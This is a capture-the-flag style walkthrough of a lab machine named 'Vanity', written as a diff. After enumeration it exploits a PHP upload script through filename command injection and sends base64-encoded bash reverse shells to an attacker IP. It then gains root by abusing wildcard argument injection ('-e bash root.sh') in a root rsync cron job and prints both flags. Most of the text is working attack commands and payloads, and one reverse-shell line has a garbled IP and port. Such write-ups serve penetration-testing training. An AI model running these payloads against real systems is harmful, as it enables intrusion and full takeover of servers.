@@ -1,0 +1,163 @@
+																							                     Vanity Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.234.234
+export IP=192.168.234.234
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+
+
+nmap -Pn -n -sC -sV -p22,80,873 $IP --open --stats-every=5s -oN results.txt
+
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+/uploads/
+
+nikto --url $IP -p 80
+
+Port 8080
+Enumeration
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/find_me.txt -t 40
+
+Port 873
+Enumerate shared folders
+
+rsync $IP::
+source          Web Source
+backup          Virus Samples Backup
+
+
+# Download the contents of the shared folder
+
+rsync -av rsync://$IP:873/source ./rsyn_shared
+
+cat uploads/upload.php
+
+<?php
+
+        //Check if the file is well uploaded
+        if($_FILES['file']['error'] > 0) { echo 'Error during uploading, try again'; }
+
+
+        //Set up valid extension
+        $extsNotAllowed = array( 'php','php7','php6','phar','phtml','phps','pht','phtm','pgif','shtml','htaccess','inc');
+
+        $extUpload = strtolower( substr( strrchr($_FILES['file']['name'], '.') ,1) ) ;
+
+        //Check if the uploaded file extension is allowed
+
+        if (in_array($extUpload, $extsNotAllowed) ) { 
+        echo 'File not allowed'; 
+
+        } 
+    else {
+        $name = "{$_FILES['file']['name']}";
+        $result = move_uploaded_file($_FILES['file']['tmp_name'], $name);
+        if($result){
+            system("/usr/bin/clamscan $name");
+        }
+    }
+
+?>  
+
+# The code uses the system() function to execute the clamscan command-line tool. If the $name variable contains a command or a shell metacharacter, an attacker can inject arbitrary commands and execute them on the server.
+   Let's try to see if we can perform command injection through filename using burp. Create a random txt file and intercept the request.
+   
+POST /uploads/upload.php HTTP/1.1
+Host: 192.168.234.234
+--------------------------------------------------------------
+
+------WebKitFormBoundaryKVBFVi4PbYiCZXct
+Content-Disposition: form-data; name="file"; filename="test.txt||id"
+Content-Type: text/plain
+
+1234
+
+------WebKitFormBoundaryKVBFVi4PbYiCZXct--
+
+
+----------- SCAN SUMMARY -----------
+Known viruses: 8641122
+Engine version: 0.103.6
+Scanned directories: 0
+Scanned files: 0
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 17.512 sec (0 m 17 s)
+Start Date: 2023:04:24 07:20:56
+End Date:   2023:04:24 07:21:14
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Now that we have confirmed command injection, let's try to obtain a reverse shell. Encode in base64 the bash shell first.
+
+echo "bash -i >& /dev/tcp/192.168.45.580 0>&1" | base64 
+   
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjUvODAgMD4mMQ== | base64 -d | bash"
+
+POST /uploads/upload.php HTTP/1.1
+Host: 192.168.234.234
+--------------------------------------------------------------
+
+------WebKitFormBoundaryKVBFVi4PbYiCZXct
+Content-Disposition: form-data; name="file"; filename="test.txt||echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjUvODAgMD4mMQ== | base64 -d | bash"
+Content-Type: text/plain
+
+nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.234.234] 44306
+bash: cannot set terminal process group (990): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@vanity:/var/www/html/uploads$                                                                           # Got shell
+
+cat /var/www/local.txt                                                 # Flag: a6507a2d5331688a73c58e1901e9cc48
+
+
+Privilege escalation
+
+cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* *         * * *       root    bash /opt/backup.sh
+
+cat /opt/backup.sh
+rsync --password-file=/root/passwd -a * rsync://vanity/backup/
+
+# By looking at rsync manual, we notice an interesting switch that allows us to connect to a shell.
+
+--rsh=COMMAND, -e        specify the remote shell to use
+
+# Create a bash file containing a reverse shell
+echo "bash -i >& /dev/tcp/192.168.45.5/4444 0>&1" > root.sh
+
+# Create a new file containing the -e switch in the file name, this allows rsync to connect to a shell. 
+touch '/var/www/html/uploads/-e bash root.sh' 
+
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.234.234] 60390
+bash: cannot set terminal process group (7759): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vanity:/var/www/html/uploads# 
+
+cat /root/proof.txt                                         # Flag: 0d6b6bc1cefc7cf7f7f2e8d5559c1ae0
